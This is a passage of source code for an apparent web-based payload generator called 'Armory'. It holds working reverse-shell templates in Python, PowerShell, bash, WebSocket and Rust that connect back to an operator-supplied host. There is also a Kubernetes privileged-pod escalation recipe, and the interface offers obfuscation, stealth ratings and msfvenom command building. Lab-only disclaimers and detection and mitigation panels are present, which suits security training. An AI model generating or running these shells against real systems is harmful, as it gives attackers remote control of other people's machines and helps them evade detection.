      rawCode = base + `#!/usr/bin/env python3
# GCP Compute Reverse Shell — Python
import socket, subprocess, os, sys
import requests

def get_instance_metadata():
    try:
        r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/id',
                         headers={'Metadata-Flavor': 'Google'}, timeout=2)
        return r.text
    except:
        return 'unknown'

def reverse_shell():
    try:
        instance_id = get_instance_metadata()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("${lhost}", ${lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    reverse_shell()

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'azure_vm_reverse': {
      rawCode = base + `# Azure VM Reverse Shell — PowerShell
$imds = Invoke-RestMethod -Headers @{"Metadata"="true"} -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Method Get
$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'docker_reverse': {
      rawCode = base + `#!/bin/bash
# Docker Container Reverse Shell
# Run inside a compromised container
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1

# Alternative using Python (if bash /dev/tcp is unavailable):
# python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'kubernetes_exec': {
      rawCode = base + `# Kubernetes Exec Shell
# Get a shell in a pod:
kubectl exec -it <pod-name> -- /bin/bash

# If you have a compromised service account:
kubectl auth can-i --list
kubectl get pods
kubectl exec -it <pod-name> -- /bin/sh

# For privilege escalation, create a privileged pod:
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: shell
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
  hostNetwork: true
  hostPID: true
EOF

kubectl exec -it privileged-pod -- /bin/sh

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'python_websocket_shell': {
      rawCode = base + `#!/usr/bin/env python3
# Python WebSocket Reverse Shell
import asyncio
import websockets
import subprocess
import os
import sys

async def ws_shell():
    uri = f"ws://${lhost}:${lport}/shell"
    try:
        async with websockets.connect(uri) as websocket:
            while True:
                cmd = await websocket.recv()
                if cmd == 'exit':
                    break
                try:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    await websocket.send(out.decode())
                except Exception as e:
                    await websocket.send(str(e))
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(ws_shell())

# ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    case 'rust_reverse': {
      rawCode = base + `// Rust Reverse Shell
use std::net::TcpStream;
use std::os::unix::io::AsRawFd;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

fn main() {
    loop {
        if let Ok(stream) = TcpStream::connect("${lhost}:${lport}") {
            let fd = stream.as_raw_fd();
            let _ = Command::new("/bin/sh")
                .stdin(Stdio::from_raw_fd(fd))
                .stdout(Stdio::from_raw_fd(fd))
                .stderr(Stdio::from_raw_fd(fd))
                .status();
        }
        thread::sleep(Duration::from_secs(5));
    }
}

// Compile with: rustc -C opt-level=3 -C lto=true -C target-feature=+crt-static reverse.rs
// Cross-compile: cargo build --target x86_64-unknown-linux-musl --release

// ⚠️ LAB USE ONLY — unauthorized use is illegal`;
      break;
    }
    default:
      rawCode = base + `// ${type} payload not yet implemented`;
  }

  return obfuscateCode(rawCode, format, obfuscation);
}

// ─── Main Component ───────────────────────────────────────
export default function Armory() {
  const [activeTab, setActiveTab] = useState<'generator' | 'encyclopedia'>('generator');
  const [selectedPayload, setSelectedPayload] = useState<PayloadType>('reverse_shell');
  const [format, setFormat] = useState<OutputFormat>('python');
  const [lhost, setLhost] = useState('10.10.14.5');
  const [lport, setLport] = useState(4444);
  const [obfuscation, setObfuscation] = useState<ObfuscationLevel>('none');
  const [generatedPayload, setGeneratedPayload] = useState('');
  const [showRaw, setShowRaw] = useState(false);
  const [expandedPayloads, setExpandedPayloads] = useState<Set<PayloadType>>(new Set());
  const [copyStatus, setCopyStatus] = useState<'idle' | 'success' | 'error' | 'manual'>('idle');
  const [lhostError, setLhostError] = useState<string | null>(null);
  const [lportError, setLportError] = useState<string | null>(null);
  const [showPayloadInfo, setShowPayloadInfo] = useState(true);
  const [encyclopediaSearch, setEncyclopediaSearch] = useState('');
  const [autoGenerate, setAutoGenerate] = useState(true);
  const [history, setHistory] = useState<HistoryEntry[]>([]);
  const [listenerCopyOk, setListenerCopyOk] = useState(false);

  const currentPayloadInfo = PAYLOAD_BY_TYPE[selectedPayload];

  const saveTimeoutRef = useRef<TimerHandle | null>(null);
  const copyTimerRef = useRef<TimerHandle | null>(null);
  const manualCopyRef = useRef<HTMLPreElement>(null);
  const initRef = useRef(false);

  // Load config from localStorage ONCE
  useEffect(() => {
    if (initRef.current) return;
    initRef.current = true;

    type SavedConfig = {
      lhost?: unknown;
      lport?: unknown;
      selectedPayload?: unknown;
      format?: unknown;
      obfuscation?: unknown;
    };

    const isPayloadType = (value: unknown): value is PayloadType =>
      typeof value === 'string' && value in PAYLOAD_BY_TYPE;

    const isOutputFormat = (value: unknown): value is OutputFormat =>
      typeof value === 'string' && [
        'powershell', 'csharp', 'python', 'go', 'raw_c', 'vba', 'javascript',
        'php', 'jsp', 'aspx', 'bash', 'perl', 'ruby', 'batch', 'hta', 'xml', 'inf', 'rust'
      ].includes(value);

    const isObfuscationLevel = (value: unknown): value is ObfuscationLevel =>
      typeof value === 'string' && ['none', 'light', 'medium', 'heavy'].includes(value);

    const saved = localStorage.getItem(STORAGE_KEY);
    if (!saved) return;

    try {
      const config = JSON.parse(saved) as SavedConfig;

      if (typeof config.lhost === 'string') setLhost(config.lhost);
      if (typeof config.lport === 'number' && config.lport >= 1 && config.lport <= 65535) {
        setLport(config.lport);
      }

      const selectedPayloadValue = config.selectedPayload;
      const hasValidPayload = isPayloadType(selectedPayloadValue);
      if (hasValidPayload) {
        setSelectedPayload(selectedPayloadValue);
      }

      const payload = hasValidPayload
        ? PAYLOAD_BY_TYPE[selectedPayloadValue]
        : PAYLOAD_BY_TYPE[selectedPayload];

      if (isOutputFormat(config.format) && payload.supportedFormats.includes(config.format)) {
        setFormat(config.format);
      } else if (payload.supportedFormats.length > 0) {
        setFormat(payload.supportedFormats[0]);
      }

      if (isObfuscationLevel(config.obfuscation)) setObfuscation(config.obfuscation);
    } catch (err) {
      console.error('payloadforge_config: failed to parse saved config:', err);
    }
  }, []);

  // Debounced save to localStorage
  useEffect(() => {
    if (!initRef.current) return;

    if (saveTimeoutRef.current) {
      clearTimeout(saveTimeoutRef.current);
    }

    saveTimeoutRef.current = setTimeout(() => {
      try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify({
          lhost,
          lport,
          selectedPayload,
          format,
          obfuscation
        }));
      } catch (err) {
        if (err instanceof DOMException && err.name === 'QuotaExceededError') {
          console.error('payloadforge_config: localStorage quota exceeded');
        } else {
          console.error('payloadforge_config: save failed', err);
        }
      }
    }, 500);

    return () => {
      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current);
      }
    };
  }, [lhost, lport, selectedPayload, format, obfuscation]);

  const handlePayloadChange = (newType: PayloadType) => {
    setSelectedPayload(newType);
    const info = PAYLOAD_BY_TYPE[newType];
    if (info) {
      if (info.requiresLport) setLport(info.defaultPort);
      if (!info.supportedFormats.includes(format)) {
        setFormat(info.supportedFormats[0]);
      }
    }
  };

  const handleLportChange = (value: string) => {
    if (value === '') {
      setLportError(null);
      return;
    }
    const parsed = parseInt(value, 10);
    if (isNaN(parsed)) {
      setLportError('Invalid port number');
      return;
    }
    if (parsed < 1 || parsed > 65535) {
      setLportError('Port must be 1-65535');
      return;
    }
    setLport(parsed);
    setLportError(null);
  };

  const handleLhostChange = (value: string) => {
    const trimmed = value.trim();
    if (trimmed === '') {
      setLhostError(null);
      return;
    }

    if (trimmed === 'localhost') {
      setLhost(trimmed);
      setLhostError(null);
      return;
    }

    const ipv4Match = trimmed.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
    if (ipv4Match) {
      const octets = [ipv4Match[1], ipv4Match[2], ipv4Match[3], ipv4Match[4]].map(Number);
      if (octets.every(o => o >= 0 && o <= 255)) {
        setLhost(trimmed);
        setLhostError(null);
        return;
      }
      setLhostError(`Invalid IPv4: "${trimmed}" — octets must be 0-255`);
      return;
    }

    if (trimmed.includes(':') && !/\s/.test(trimmed) && /^[0-9a-fA-F:]+$/.test(trimmed)) {
      setLhost(trimmed);
      setLhostError(null);
      return;
    }

    if (/^[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9_-]{0,61}[a-zA-Z0-9])?)*$/.test(trimmed)) {
      setLhost(trimmed);
      setLhostError(null);
      return;
    }

    setLhostError(`Invalid LHOST: "${trimmed}" — use IPv4 (10.0.0.1), IPv6, or hostname`);
  };

  const copyToClipboard = async (text: string) => {
    if (copyTimerRef.current) {
      clearTimeout(copyTimerRef.current);
      copyTimerRef.current = null;
    }

    try {
      await navigator.clipboard.writeText(text);
      setCopyStatus('success');
      copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000);
    } catch (e) {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      textarea.style.position = 'fixed';
      textarea.style.opacity = '0';
      textarea.style.left = '-9999px';
      document.body.appendChild(textarea);
      textarea.focus();
      textarea.select();
      let succeeded = false;
      try {
        succeeded = document.execCommand('copy');
      } catch { }
      document.body.removeChild(textarea);

      if (!succeeded) {
        setCopyStatus('manual');
        return;
      } else {
        setCopyStatus('success');
        copyTimerRef.current = setTimeout(() => setCopyStatus('idle'), 2000);
      }
    }
  };

  const downloadPayload = () => {
    if (!generatedPayload) return;
    const mimeType = FORMAT_MIMES[format] ?? 'application/octet-stream';
    const blob = new Blob([generatedPayload], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    const ext = FORMAT_EXTENSIONS[format] || 'txt';
    a.download = `${selectedPayload}_${format}.${ext}`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const generate = () => {
    if (currentPayloadInfo.requiresLhost && lhost.trim() === '') {
      setLhostError('LHOST is required for this payload');
      return;
    }
    if (currentPayloadInfo.requiresLport && (lport < 1 || lport > 65535)) {
      setLportError('Valid port (1-65535) is required');
      return;
    }
    if (lhostError || lportError) return;
    const payload = generatePayloadCode(selectedPayload, format, lhost, lport, obfuscation);
    setGeneratedPayload(payload);
    setHistory(prev => {
      const entry: HistoryEntry = {
        id: `${Date.now()}`,
        at: Date.now(),
        type: selectedPayload,
        format,
        lhost,
        lport,
        snippet: payload.slice(0, 160).replace(/\s+/g, ' '),
      };
      return [entry, ...prev].slice(0, 12);
    });
  };

  // Auto-regenerate
  useEffect(() => {
    if (!autoGenerate || !initRef.current) return;
    if (currentPayloadInfo.requiresLhost && !lhost.trim()) return;
    if (currentPayloadInfo.requiresLport && (lport < 1 || lport > 65535)) return;
    if (lhostError || lportError) return;
    const t = setTimeout(() => {
      const payload = generatePayloadCode(selectedPayload, format, lhost, lport, obfuscation);
      setGeneratedPayload(payload);
    }, 350);
    return () => clearTimeout(t);
  }, [selectedPayload, format, lhost, lport, obfuscation, autoGenerate, currentPayloadInfo, lhostError, lportError]);

  const msfvenomCmd = useMemo(
    () => buildMsfvenomCommand(selectedPayload, format, lhost, lport),
    [selectedPayload, format, lhost, lport]
  );

  const copyListener = async () => {
    const cmd = substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport);
    try {
      await navigator.clipboard.writeText(cmd);
      setListenerCopyOk(true);
      setTimeout(() => setListenerCopyOk(false), 1500);
    } catch {
      window.prompt('Copy listener command:', cmd);
    }
  };

  const handleSelectAll = () => {
    if (!manualCopyRef.current) return;
    const range = document.createRange();
    range.selectNodeContents(manualCopyRef.current);
    const sel = window.getSelection();
    sel?.removeAllRanges();
    sel?.addRange(range);
  };

  useEffect(() => {
    if (copyStatus === 'manual' && manualCopyRef.current) {
      handleSelectAll();
      manualCopyRef.current.focus();
    }
  }, [copyStatus]);

  const toggleExpand = (type: PayloadType) => {
    setExpandedPayloads(prev => {
      const next = new Set(prev);
      if (next.has(type)) {
        next.delete(type);
      } else {
        next.add(type);
        if (next.size > 10) {
          const first = next.values().next().value;
          if (first !== undefined) {
            next.delete(first);
          }
        }
      }
      return next;
    });
  };

  const payloadCategories = useMemo(() => {
    const groups: Record<string, PayloadInfo[]> = {};
    PAYLOAD_ENCYCLOPEDIA.forEach(p => {
      if (!groups[p.category]) groups[p.category] = [];
      groups[p.category].push(p);
    });
    return groups;
  }, []);

  const filteredEncyclopedia = useMemo(() => {
    const q = encyclopediaSearch.trim().toLowerCase();
    if (!q) return PAYLOAD_ENCYCLOPEDIA;
    return PAYLOAD_ENCYCLOPEDIA.filter(p =>
      p.name.toLowerCase().includes(q) ||
      p.category.toLowerCase().includes(q) ||
      p.description.toLowerCase().includes(q) ||
      p.type.toLowerCase().includes(q) ||
      p.whereToUse.toLowerCase().includes(q)
    );
  }, [encyclopediaSearch]);

  const inputClass = "w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm font-mono text-white/80 focus:outline-none focus:border-red-500/40 placeholder-white/20 transition-colors";
  const selectClass = "w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 focus:outline-none focus:border-red-500/40 transition-colors [&>option]:bg-[#0d1022]";

  const getStealthBadge = (rating: string) => {
    const colors = {
      Low: 'bg-red-500/20 text-red-400 border-red-500/30',
      Medium: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
      High: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30',
    };
    return colors[rating as keyof typeof colors] || colors.Low;
  };

  return (
    <div className="min-h-full overflow-y-auto" style={{ background: 'linear-gradient(145deg, #080b1a 0%, #0d1225 40%, #0a0d1e 100%)' }}>

      {/* ── Header ── */}
      <div className="flex items-center justify-between px-6 py-4 border-b border-white/5 flex-wrap gap-2 sticky top-0 z-10 backdrop-blur-xl bg-[#0d1225]/80">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl flex items-center justify-center border border-red-500/30 shadow-lg shadow-red-500/10" style={{ background: 'radial-gradient(circle, rgba(239,68,68,0.2), rgba(239,68,68,0.05))' }}>
            <Swords size={18} className="text-red-400" />
          </div>
          <div>
            <span className="text-white font-bold text-base tracking-tight">Armory</span>
            <div className="text-white/35 text-[10px] flex items-center gap-2">
              <span>Lab study · authorized testing reference</span>
              <span className="w-1 h-1 rounded-full bg-white/20" />
              <span className="text-amber-400/60">44 payloads</span>
            </div>
          </div>
        </div>
        <div className="flex gap-2 items-center flex-wrap">
          <div className="flex bg-white/5 border border-white/10 rounded-xl p-0.5">
            <button
              onClick={() => setActiveTab('encyclopedia')}
              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${activeTab === 'encyclopedia'
                  ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                  : 'text-white/40 hover:text-white/80'
                }`}
            >
              <BookOpen size={12} /> Encyclopedia
            </button>
            <button
              onClick={() => setActiveTab('generator')}
              className={`px-4 py-1.5 rounded-lg flex items-center gap-1.5 text-xs font-medium transition-all ${activeTab === 'generator'
                  ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                  : 'text-white/40 hover:text-white/80'
                }`}
            >
              <Zap size={12} /> Generator
            </button>
          </div>
        </div>
      </div>

      {/* ── Removed Disclaimer Banner ── */}

      {/* ── Main Content ── */}
      <div className="px-6 py-5 max-w-7xl mx-auto">

        {/* Educational overview */}
        <div className="mb-5">
          <button
            onClick={() => setShowPayloadInfo(!showPayloadInfo)}
            className="w-full flex items-center justify-between bg-white/5 border border-white/10 rounded-2xl px-5 py-3.5 hover:bg-white/[0.07] transition-all group"
          >
            <div className="flex items-center gap-3">
              <div className="p-2 rounded-xl bg-cyan-500/15 text-cyan-400 group-hover:scale-105 transition-transform">
                <GraduationCap size={18} />
              </div>
              <div className="text-left">
                <span className="text-white font-bold text-sm">Lab Context & Concepts</span>
                <span className="text-white/30 text-xs ml-3 hidden sm:inline">
                  {showPayloadInfo ? 'Collapse' : 'Expand'} — understand payloads in lab vs real-world
                </span>
              </div>
            </div>
            <div className="text-white/30 group-hover:text-cyan-400 transition-colors">
              {showPayloadInfo ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
            </div>
          </button>

          {showPayloadInfo && (
            <div className="bg-white/5 border border-white/10 border-t-0 rounded-b-2xl p-5 space-y-4 text-xs text-white/70 leading-relaxed animate-slideDown">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="w-1 h-8 bg-cyan-400 rounded-full" />
                    <h3 className="text-cyan-400 font-bold text-sm">What is a Payload?</h3>
                  </div>
                  <p className="text-white/50 pl-3">
                    In security training, a <span className="text-white font-semibold">payload</span> is the code that runs
                    after access is obtained — e.g., a shell session in a lab VM. Understanding categories helps you
                    <span className="text-white"> detect and defend</span> as much as it helps authorized testers.
                  </p>
                  <div className="bg-black/30 border border-white/5 rounded-xl p-3 mt-1">
                    <code className="text-xs text-cyan-400">
                      Access path → execution context → <span className="text-white font-bold">payload behavior</span>
                    </code>
                  </div>
                </div>

                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="w-1 h-8 bg-emerald-400 rounded-full" />
                    <h3 className="text-emerald-400 font-bold text-sm">Lab Use (Allowed)</h3>
                  </div>
                  <ul className="space-y-1.5 text-white/50 pl-3">
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div>Your own VMs, HTB/THM boxes, or employer-approved ranges</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div>Learning how reverse/bind/web shells appear in logs and EDR</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-emerald-400 mt-0.5">✓</span>
                      <div>Writing clear findings: what ran, what it connected to, how to fix it</div>
                    </li>
                  </ul>
                </div>

                <div className="space-y-3">
                  <div className="flex items-center gap-2">
                    <div className="w-1 h-8 bg-red-400 rounded-full" />
                    <h3 className="text-red-400 font-bold text-sm">Unauthorized Use (Illegal)</h3>
                  </div>
                  <ul className="space-y-1.5 text-white/50 pl-3">
                    <li className="flex items-start gap-2">
                      <span className="text-red-400 mt-0.5">✗</span>
                      <div>Any system you do not own and lack written permission to test</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-red-400 mt-0.5">✗</span>
                      <div>"Just checking" a friend's account, school, or employer without approval</div>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-red-400 mt-0.5">✗</span>
                      <div>Using templates outside an authorized engagement scope</div>
                    </li>
                  </ul>
                </div>
              </div>

              <div className="border-t border-white/5 pt-3 grid grid-cols-1 md:grid-cols-3 gap-3 text-[11px]">
                <div className="bg-black/30 border border-white/5 rounded-xl p-3">
                  <div className="text-amber-400 font-bold mb-1 flex items-center gap-1"><Award size={14} /> Real Red Team</div>
                  <p className="text-white/50 text-[11px]">
                    Professional engagements use custom C2, encrypted channels, and multi-stage payloads.
                    This tool provides educational templates — not production-grade attack tools.
                  </p>
                </div>
                <div className="bg-black/30 border border-white/5 rounded-xl p-3">
                  <div className="text-amber-400 font-bold mb-1 flex items-center gap-1"><Scan size={14} /> Detection Focus</div>
                  <p className="text-white/50 text-[11px]">
                    The real value is recognizing indicators: unusual outbound ports, Office spawning shells,
                    web processes running system commands, and suspicious registry changes.
                  </p>
                </div>
                <div className="bg-black/30 border border-white/5 rounded-xl p-3">
                  <div className="text-amber-400 font-bold mb-1 flex items-center gap-1"><Shield size={14} /> Authorized Testing</div>
                  <p className="text-white/50 text-[11px]">
                    Professional testing follows rules of engagement, scopes, and reporting.
                    These templates are starting points for understanding — not a license to attack.
                  </p>
                </div>
              </div>

              <div className="text-[10px] text-white/30 text-center border-t border-white/5 pt-3">
                Educational reference only. Unauthorized access and misuse are illegal.
              </div>
            </div>
          )}
        </div>

        {/* ── ENCYCLOPEDIA TAB ── */}
        {activeTab === 'encyclopedia' && (
          <div>
            <div className="mb-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div>
                <h2 className="text-xl font-semibold text-white mb-0.5 flex items-center gap-2">
                  <BookOpen size={20} className="text-red-400" /> Payload Encyclopedia
                </h2>
                <p className="text-white/35 text-sm">
                  {PAYLOAD_ENCYCLOPEDIA.length} payloads · click a card for details
                </p>
              </div>
              <input
                value={encyclopediaSearch}
                onChange={e => setEncyclopediaSearch(e.target.value)}
                placeholder="Search payloads, categories, techniques…"
                className="w-full sm:w-72 bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-sm text-white/80 placeholder-white/25 focus:outline-none focus:border-red-500/40 transition-colors"
              />
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {filteredEncyclopedia.map((payload) => {
                const isExpanded = expandedPayloads.has(payload.type);
                return (
                  <div
                    key={payload.type}
                    className={`bg-white/5 border rounded-2xl p-5 transition-all cursor-pointer ${isExpanded ? 'border-red-500/40 bg-red-500/5 shadow-lg shadow-red-500/5' : 'border-white/5 hover:border-red-500/20 hover:bg-white/[0.03]'
                      }`}
                    onClick={() => toggleExpand(payload.type)}
                  >
                    <div className="flex items-start justify-between mb-3">
                      <div className={`${payload.color} transition-transform`}>
                        {payload.icon}
                      </div>
                      <div className="flex items-center gap-2" onClick={e => e.stopPropagation()}>
                        <span className={`text-[9px] px-2 py-0.5 rounded-full border ${getStealthBadge(payload.stealthRating)}`}>
                          {payload.stealthRating} stealth
                        </span>
                        <div className="text-[10px] px-2 py-0.5 rounded-full bg-white/5 border border-white/10 text-white/40">
                          {payload.supportedFormats.length} formats
                        </div>
                        {isExpanded ? <ChevronUp size={16} className="text-white/30" /> : <ChevronDown size={16} className="text-white/30" />}
                      </div>
                    </div>

                    <h3 className="text-base font-bold text-white mb-1">{payload.name}</h3>
                    <p className="text-white/50 text-xs mb-3">{payload.description}</p>

                    <div className="flex flex-wrap gap-1.5 mb-3">
                      <span className="text-[9px] px-2 py-0.5 rounded-full bg-white/5 border border-white/10 text-white/30">
                        {payload.category}
                      </span>
                      {!payload.isComplete && (
                        <span className="text-[9px] px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 flex items-center gap-1">
                          <AlertCircle size={10} /> Template
                        </span>
                      )}
                    </div>

                    <div className="space-y-2 text-xs">
                      <div>
                        <div className="text-red-400 text-[10px] font-mono mb-0.5">WHAT IT DOES</div>
                        <p className="text-white/50">{payload.whatItDoes}</p>
                      </div>
                      <div>
                        <div className="text-red-400 text-[10px] font-mono mb-0.5">WHERE TO USE</div>
                        <p className="text-white/50">{payload.whereToUse}</p>
                      </div>
                    </div>

                    {isExpanded && (
                      <div className="mt-4 pt-4 border-t border-white/5 space-y-3 animate-slideDown">
                        <div>
                          <div className="text-cyan-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Lightbulb size={12} /> HOW IT WORKS</div>
                          <p className="text-xs text-white/50 leading-relaxed">{payload.howItWorks}</p>
                        </div>
                        <div>
                          <div className="text-amber-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Target size={12} /> EXAMPLE SCENARIO</div>
                          <p className="text-xs text-white/50">{payload.exampleScenario}</p>
                        </div>
                        <div>
                          <div className="text-emerald-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Terminal size={12} /> LISTENER COMMAND</div>
                          <code className="text-[10px] bg-black/40 px-2 py-1.5 rounded block font-mono text-emerald-400 break-all border border-white/5">
                            {payload.commonListenerCommand}
                          </code>
                        </div>
                        <div>
                          <div className="text-purple-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><Award size={12} /> LAB VS REAL WORLD</div>
                          <p className="text-xs text-white/50 leading-relaxed">{payload.labVsReal}</p>
                        </div>
                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <div className="text-red-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><AlertCircle size={12} /> DETECTION INDICATORS</div>
                            <ul className="text-[10px] text-white/50 list-disc list-inside space-y-0.5">
                              {payload.detectionIndicators.map((item, i) => <li key={i}>{item}</li>)}
                            </ul>
                          </div>
                          <div>
                            <div className="text-blue-400 text-[10px] font-mono mb-0.5 flex items-center gap-1"><CheckCircle size={12} /> MITIGATION TIPS</div>
                            <ul className="text-[10px] text-white/50 list-disc list-inside space-y-0.5">
                              {payload.mitigationTips.map((item, i) => <li key={i}>{item}</li>)}
                            </ul>
                          </div>
                        </div>
                        <div>
                          <div className="text-white/30 text-[10px] font-mono mb-0.5 flex items-center gap-1"><ExternalLink size={12} /> REFERENCES</div>
                          <ul className="text-[10px] text-white/50 list-disc list-inside">
                            {renderReferences(payload.references)}
                          </ul>
                        </div>
                        <div className="flex flex-wrap gap-2">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              handlePayloadChange(payload.type);
                              setActiveTab('generator');
                            }}
                            className="text-[10px] flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-red-400 transition-colors border border-red-500/20"
                          >
                            <Play size={12} /> Generate this payload
                          </button>
                          <span className="text-[9px] text-white/20 flex items-center gap-1">
                            <Star size={10} /> {payload.pros.length} pros · {payload.cons.length} cons
                          </span>
                        </div>
                      </div>
                    )}

                    <div className="mt-3 pt-3 border-t border-white/5 flex justify-between items-center">
                      <span className="text-[10px] text-white/30">{isExpanded ? 'Click to collapse' : 'Click for details'}</span>
                      <span className="text-[10px] text-white/30 flex items-center gap-2">
                        <span className={`px-1.5 py-0.5 rounded text-[8px] ${getStealthBadge(payload.detectionComplexity)}`}>
                          detection: {payload.detectionComplexity}
                        </span>
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* ── GENERATOR TAB ── */}
        {activeTab === 'generator' && currentPayloadInfo && (
          <div className="grid grid-cols-1 xl:grid-cols-12 gap-5">
            <div className="xl:col-span-5 space-y-4">
              <div className="bg-white/5 border border-white/5 rounded-2xl p-5 shadow-lg shadow-black/20">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                    <Target size={16} className="text-red-400" /> Payload Configuration
                  </h3>
                  <button
                    onClick={() => {
                      setLhost('10.10.14.5');
                      setLport(currentPayloadInfo.defaultPort);
                      setFormat(currentPayloadInfo.supportedFormats[0]);
                      setObfuscation('none');
                      setGeneratedPayload('');
                      setShowRaw(false);
                      setLhostError(null);
                      setLportError(null);
                    }}
                    className="text-[10px] text-white/40 hover:text-white/80 transition-colors"
                  >
                    Reset
                  </button>
                </div>

                <div className="mb-4">
                  <label className="text-[10px] text-white/40 block mb-1.5 font-medium">Payload Type</label>
                  <select
                    value={selectedPayload}
                    onChange={(e) => handlePayloadChange(e.target.value as PayloadType)}
                    className={selectClass}
                  >
                    {Object.entries(payloadCategories).map(([category, payloads]) => (
                      <optgroup key={category} label={category}>
                        {payloads.map(p => (
                          <option key={p.type} value={p.type} style={{ background: '#0d1022' }}>{p.name}</option>
                        ))}
                      </optgroup>
                    ))}
                  </select>
                </div>

                <div className="mb-4 p-3 bg-black/40 border border-white/5 rounded-xl">
                  <div className="flex items-center gap-2 mb-2">
                    <div className={currentPayloadInfo.color}>{currentPayloadInfo.icon}</div>
                    <div>
                      <div className="text-sm font-semibold text-white">{currentPayloadInfo.name}</div>
                      <div className="text-[10px] text-white/40">{currentPayloadInfo.description}</div>
                    </div>
                  </div>
                  <div className="text-[10px] text-white/40 space-y-0.5">
                    <div><strong className="text-red-400">Where to use:</strong> {currentPayloadInfo.whereToUse}</div>
                    <div className="flex items-start gap-2 flex-wrap">
                      <strong className="text-red-400">Listener:</strong>
                      <code className="text-cyan-400 bg-black/30 px-1.5 py-0.5 rounded break-all flex-1 font-mono text-[10px]">
                        {substituteListener(currentPayloadInfo.commonListenerCommand, lhost, lport)}
                      </code>
                      <button
                        type="button"
                        onClick={copyListener}
                        className="text-[10px] px-2 py-0.5 rounded border border-white/10 text-white/50 hover:text-white/80 transition-colors"
                      >
                        {listenerCopyOk ? '✓' : 'Copy'}
                      </button>
                    </div>
                  </div>
                  <div className="flex gap-2 mt-1.5 flex-wrap">
                    <span className={`text-[8px] px-1.5 py-0.5 rounded-full border ${getStealthBadge(currentPayloadInfo.stealthRating)}`}>
                      stealth: {currentPayloadInfo.stealthRating}
                    </span>
                    <span className={`text-[8px] px-1.5 py-0.5 rounded-full border ${getStealthBadge(currentPayloadInfo.detectionComplexity)}`}>
                      detection: {currentPayloadInfo.detectionComplexity}
                    </span>
                    {!currentPayloadInfo.isComplete && (
